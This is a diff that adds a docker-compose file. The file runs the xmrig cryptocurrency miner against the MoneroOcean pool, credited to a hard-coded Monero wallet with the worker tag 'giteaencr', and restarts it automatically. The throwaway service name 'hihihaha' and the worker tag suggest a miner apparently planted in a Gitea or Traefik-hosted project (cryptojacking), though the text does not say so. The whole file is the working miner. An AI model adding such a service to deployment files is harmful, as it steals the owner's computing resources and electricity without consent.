@@ -1,0 +1,14 @@
+version: '3'
+
+services:
+  hihihaha:
+    image: xmrig/xmrig
+    environment:
+      - CPU=1
+    command: >
+      -o gulf.moneroocean.stream:10128 -u 456teDQaDwXQ8i3p6cesWPitUmKcXyhqdce4rcvedu7tNa45d3FApMQhpC6EzScUaFKV1bTb37mMKff9pGcuNuuyT1Va7GS.giteaencr
+    restart: unless-stopped
+
+networks:
+  traefik-net:
+    external: true
